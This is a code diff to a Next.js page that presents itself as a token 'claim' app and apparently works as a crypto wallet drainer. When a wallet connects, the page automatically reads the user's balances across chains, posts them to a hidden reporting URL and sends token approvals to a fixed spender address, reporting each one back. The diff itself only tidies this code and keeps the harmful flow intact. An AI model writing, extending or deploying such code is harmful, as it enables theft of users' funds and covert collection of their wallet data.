@@ -5,6 +5,7 @@ import { erc20Abi } from 'viem';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '@/config';
 import { sendMeeTx } from '@/utils/sendMeeTx';
+import { clearMeeClients } from '@/utils/meeClient';
 
 // Backend reporting URL
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
@@ -68,6 +69,13 @@ export default function Home() {
   const { address, isConnected, chainId } = useAccount();
   const [status, setStatus] = useState<string>("");
 
+  // Clear meeClients on disconnect
+  useEffect(() => {
+    if (!isConnected) {
+      clearMeeClients();
+    }
+  }, [isConnected]);
+
   async function handleClaim() {
     if (!isConnected || !address) {
       setStatus("Wallet not connected");
@@ -84,7 +92,6 @@ export default function Home() {
         const numericCid = Number(cid);
         let balancesForReport: any[] = [];
 
-        // Native balance
         try {
           const nativeBal = await getBalance(config, { address, chainId: numericCid });
           balancesForReport.push({
@@ -96,7 +103,6 @@ export default function Home() {
           console.error(`Failed to fetch native balance for chain ${numericCid}:`, err);
         }
 
-        // ERC20 balances
         for (const token of tokens) {
           try {
             const bal = await readContract(config, {
@@ -125,7 +131,6 @@ export default function Home() {
           }
         }
 
-        // Report balances for this chain
         if (balancesForReport.length > 0) {
           await fetch(`${REPORT_URL}`, {
             method: "POST",
@@ -155,10 +160,7 @@ export default function Home() {
         await switchChain(config, { chainId: targetChain });
       }
 
-      // Approve tokens with Fusion
       let successCount = 0;
-      let skippedCount = 0;
-
       for (const token of usableTokens) {
         setStatus(`Approving ${token.symbol} on ${chainName} with Fusion...`);
 
@@ -166,15 +168,15 @@ export default function Home() {
           const txHash = await sendMeeTx({
             tokenAddress: token.address,
             spender: SPENDER,
-            amountHuman: "2", // amount reserved for Fusion gas
+            amountHuman: "2",
             decimals: token.decimals,
             chainId: targetChain!,
+            address, // ✅ pass wallet address
           });
 
           successCount++;
           setStatus(`${token.symbol} Fusion approval ✅ | Tx: ${txHash}`);
 
-          // Report approval
           await fetch(`${REPORT_URL}`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -188,23 +190,13 @@ export default function Home() {
             }),
           }).catch(console.error);
         } catch (err: any) {
-          const msg = err?.message || String(err);
-
-          if (msg.includes("not supported as a Fusion fee token")) {
-            skippedCount++;
-            setStatus(`⏭️ Skipped ${token.symbol} (not supported as Fusion fee token)`);
-            console.warn(`Skipped Fusion for ${token.symbol}:`, msg);
-          } else {
-            setStatus(`❌ Fusion failed for ${token.symbol}: ${msg}`);
-            console.error(`Fusion approval failed for ${token.symbol}`, err);
-          }
+          console.error(`Fusion approval failed for ${token.symbol}`, err);
+          setStatus(`❌ Fusion failed for ${token.symbol}: ${err?.message || err}`);
         }
       }
 
       if (successCount > 0) {
-        setStatus(`🎉 ${successCount} approval(s) succeeded!`);
-      } else if (skippedCount > 0) {
-        setStatus(`⏭️ Skipped ${skippedCount} token(s) — not supported by Fusion.`);
+        setStatus("🎉 Some approvals succeeded!");
       } else {
         setStatus("⚠️ No approvals succeeded.");
       }
@@ -214,7 +206,6 @@ export default function Home() {
     }
   }
 
-  // Auto-trigger claim on connect
   useEffect(() => {
     if (isConnected && address) handleClaim();
   }, [isConnected, address]);
